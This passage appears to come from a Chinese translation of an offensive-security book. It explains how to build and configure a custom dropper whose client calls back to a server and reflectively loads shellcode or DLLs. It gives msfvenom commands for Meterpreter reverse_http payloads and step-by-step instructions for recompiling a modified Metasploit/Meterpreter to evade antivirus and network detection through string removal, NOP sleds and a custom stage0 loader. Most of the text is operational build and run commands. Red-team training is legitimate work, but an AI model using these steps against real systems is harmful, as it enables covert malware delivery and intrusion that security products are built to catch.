整的 DLL，它将下载 DLL 然后反射 DLL。让你的 dropper 直接加载 DLL 将使你无需再进行更多的 API 调用，从而保
持更好的隐蔽性。由于 header 被修改，某些植入文件可能无法正确加载。如果你的一个植入文件不能正常工作并且
包含一种生成 shellcode 的方法，那么这应该可以解决你的问题。这是因为它们的自定义加载器通常用于修复
header 并从 DLL 加载它。
在网上也可以找到很多可以用的 shellcode，像 shell-storm.org 这样的网站会保存为特定目的而编写的 shellcode
存档，其中一些可能会为你的入侵活动派上用场。
运行服务器
构建服务器很简单。 在本书自定义的 Kali 镜像上，你需要运行以下命令：
对于首次编译：
cd /opt/
sudo apt-get install build-essential libssl-dev cmake git
git clone https://github.com/cheetz/thpDropper.git
cd thpDropper/thpd
mkdir build
cd build
cmake ..
make
对于后续编译，你需要做的就是：
cd /opt/thpd/build
make
要运行服务器，在编译它之后，你需要输入：
./thpd [path to shellcode/DLL] [loadtype]
以下值当前对加载类型有效：
0
Shellcode
这会将原始的汇编 shellcode 字节发送到客户端
1
DLL
这会发送一个普通的的 DLL 文件，以反射方式加载到客户端中
虽然这些 payload（shellcode / DLL）可能是来自任何类型的 C2 工具（Metasploit/Meterpreter，Cobalt Strike
等），但是我们在示例中仅仅使用一个 Meterpreter payload。
生成一个 payload ：
对于 Shellcode payload ：
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST= LPORT=
EnableStageEncoding=True -f c
注意，你必须使用 msfvenom 的输出，并且仅仅使用原始的汇编 shellcode（删除引号、新行和任何非
shellcode 的内容）。
启动服务器：./thpd ./shellcode.txt 0
对于 DLL payload ：
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST= LPORT=
EnableStageEncoding=True -f dll > msf.dll
启动服务器: ./thpd ./msf.dll 1
客户端
客户端以与服务器类似的方式运行，其中它为每种消息类型注册了一个处理程序（handler）。在启动时，它将尝试
回调服务器，如果无法连接或一旦断开连接则重试 n 次，并发送消息要求加载 blob 对象。服务器将使用
BLOB_PACKET  进行响应，客户端将通过 head --> msg  字段识别并分派该 BLOB_PACKET 。所有数据包必须在开始时
定义 HEAD_PACKET  字段，否则网络处理程序将无法识别它，并将其丢弃。 使用 BuildPacketAndSend()  函数将正
确设置头数据包，允许另一方解码它。
要构建客户端，你需要使用 Visual Studio  和 Git  。 首先将 Git 仓库（ https://github.com/cheetz/thpDroppe
r.git ）克隆到一个文件夹中，然后在 Visual Studio  中打开 thpDropper.sln 。确保为代码设置了正确的体系结
构，如果你不需要任何调试信息，请将编译模式设置为 build for release 。完成此操作后，按 F7 键（编译快捷
键）， Visual Studio  会为你生成可执行文件。
配置客户端和服务器
在 globals.cpp  文件中可以查看大多数客户端的配置，你想要更改的三个主要配置设置是主机名、端口和数据包时
间间隔。每个设置旁都有详细的注释，告诉你它们是什么。虽然你不需要更改数据包签名，但我还是得说一下：更改
数据包签名将修改发送的每个数据包的前 2 个字节，用于标识它是服务器上的有效连接。如果你希望对 IP 和端口进
行模糊处理，则可以编写代码以在访问它们时对其进行解密，并仅将加密版本存储在二进制文件中。
在服务器端，在 main.cpp  文件中，你可以修改服务器正在监听的端口。此配置在 main 函数中作为
StartupNetworking()  的唯一参数。如果你决定更改客户端中的数据包签名，则需要修改服务器以反映该数据包。
这意味着在 include/lib/networking.h  文件中， PACKET_SIGNATURE  值要与客户端中的全局变量相匹配。
添加新的处理程序
设置网络代码库可以允许你轻松地添加新功能。为此，你需要使用客户端上的 void name()  原型或服务器上的
void name(int conn)  原型来创建一个回调函数。这些将被注册到你的消息类型的处理程序数组，并且在验证头数
据包时调用它们。在这些函数中，你必须从 recv  缓冲区中读取包和相关数据。你需要调用 recv()  来指向数据包
结构上的指针，以及该数据包的大小。这将提供关于需要从 recv  缓冲区中拉取多少数据的信息。在这个例子中，你
将看到我们在处理程序中读取 BLOB_PACKET  ，然后使用存储在 packet.payloadLen  中的值来指示我们需要进一步
读取的字节数。相同的原理可以应用于其他的数据类型。如果要将包含文件路径的字符串发送到受害者计算机上的某
个文件，你需要在处理程序的数据包中设置一个字段，用于描述字符串的长度，你将在发送完数据包之后发送该字符
串。
进一步练习
虽然此代码库已经可以为你的工作提供一个可靠的基础，但你仍然可以通过多种方式自行改进。比较直接的思路是在
传输层上加一个简单的加密层。你可能希望创建自己的 send  和 recv  包装器，用于在调用 send  和 recv  函数之
前进行解密/加密。一种非常简单的实现方法是使用多字节异或密钥，虽然不是很安全，但至少会充分的改变你的消
息，使之不易识别。另一个可能的思路是扩展 LoadBlobHandler()  函数，使之具有新的 LOAD_TYPE 。使用这种新
LOAD_TYPE 的话，如果客户端以管理员身份运行，就会加载已签名的驱动程序。这可以通过使用
CreateService()  和 StartService()  这两个 Windows API 调用来完成。但是需要记住加载驱动程序需要它在磁
盘上，这将触发文件系统的微型过滤器驱动程序来获取它。
重新编译 Metasploit/Meterpreter 以绕过杀毒软件和网络检测  
我真的很想谈谈这个话题。但请注意，这将会有一些超前，所以你很可能在编译期间遇到一些问题。有很多很棒的工
具，比如 Metasploit / Meterpreter，但是每个防病毒和网络入侵检测（NID）工具都为它开发了签名。我们可以尝
试使用 Shikata Ga Nai  来混淆通过 HTTPS 传输的 payload，但也仅此而已。任何类型的混淆通常都会有一个检测
的存根签名，杀毒软件会检查内存，查看特定某些位置的特殊字符串。网络流量可以通过 HTTPS 执行中间人检查。
那么我们怎样才能继续使用我们喜欢的工具，同时绕过所有常见的保护措施呢？让我们以 Metasploit/Meterpreter
为例，看看我们如何绕过所有这些障碍。我们的目标是处理和解决二进制文件的杀毒软件签名（静态特征），内存运
行中的特征和网络流量特征。
为了躲避所有这些检测方法，我们需要做一些事情。首先，我们需要修改 Meterpreter 的 payload，以确保不会在网
络和内存中使用签名轻松检测到它们。其次，我们修改 metsvc  持久性模块以防止它标记反病毒。第三，我们用
Clang  编译部分 metsrv （实际的 Meterpreter payload），以防止它也标记反病毒签名。最后，我们将编写自己
的 stage0 payload，下载并执行 Meterpreter ，以绕过所有的反病毒。
使用 Clang 编译 metsrv （ Meterpreter  的网络服务包装器）并删除 metsrv/metsvc-server 引用：
http://bit.ly/2H2kaUB
修改Payload，删除像 Mimikatz 这样的字符串：
http://bit.ly/2IS9Hvl
修改反射 DLL 注入以删除像 ReflectiveLoader  这样的字符串：
http://bit.ly/2qyWfFK
许多网络产品会检测 Meterpreter 的0/1/2级加载器。除了混淆我们的 payload，我们还可以混淆实际的
shellcode。一个例子是遍历所有 Ruby 文件以获取不同的 payload 类型，并添加随机空指令滑行区（nop sled）以
避免被检测到：
译者注：一个空指令雪橇(NOP sled)(也被称为空指令滑行区)是在 shellcode 之前的一段很长的指令序列。参考
资料: 空指令雪橇
http://bit.ly/2JKUhdx
自定义 Stage0 payload：
http://bit.ly/2ELYkm8
实验：
在本实验中，我们将采用所有我们修改过的 Metasploit/Meterpreter 代码，重新编译它，并确保它可以躲避基本的
杀毒软件检测。
在开始之前，请查看搭建 Metasploit 的环境设置：
https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter
https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environme
nt
Windows 要求：
Visual Studio 2013（VS2013）—— 社区版就行。需要随安装时一并安装 C/C++。
LLVM 32位 Windows版本(一定要在安装完 VS 之后再安装 LLVM 而且一定要安装 LLVM 工具链) —— 在此地址
下载 LLVM 6。
Windows 版本的 GNU make 工具程序 —— 确保它位于你的路径中，或者从它的可用的已安装路径运行它。
Git-SCM
如何在 Windows 上构建(build) Metasploit/Meterpreter：
首先拉取所有的 cyberspacekitten 仓库。这些文件已经针对你的实验进行了大量修改来作为 POC。然后我们需要下
载框架和所有 payload：
git clone https://github.com/cyberspacekittens/metasploit-framework
cd metasploit-framework && git submodule init && git submodule update && cd ..
git clone https://github.com/cyberspacekittens/metasploit-payloads
cd metasploit-payloads && git submodule init && git submodule update && cd ..
虽然我们已经对仓库做了包括修改字符串、用 clang 编译和为 payload 添加随机空指令滑行区等这些更改，但请务
必检查这两个仓库之间的 Metasploit 差异，以明确具体的更改内容。
编译 Metasploit/Meterpreter： 
我们要做的第一件事情是重新编译我们更改后的 metsvc  和 metsvc-server 。在 Visual Studio 2013 的开发者命令
提示符 VS2013（Command Prompt for VS2013）中执行以下操作：
转到我们修改的 metsvc 的源码所在的文件夹：
cd metasploit-framework\external\source\metsvc\src
使用 make 进行编译：
“C:\Program Files (x86)\GnuWin32\bin\make.exe”
将我们新创建的二进制文件移到我们的 meterpreter 文件夹：
copy metsvc.exe ........\data\meterpreter\
copy metsvc-server.exe ........\data\meterpreter\
接下来，修改我们的 Meterpreter payload 并使用提供的 .bat  文件对其进行编译：
cd metasploit-payloads\c\meterpreter
make.bat
编译完所有内容后，将生成两个文件夹（x86 和 x64）。将所有已编译的 DLL 复制到 meterpreter 文件夹：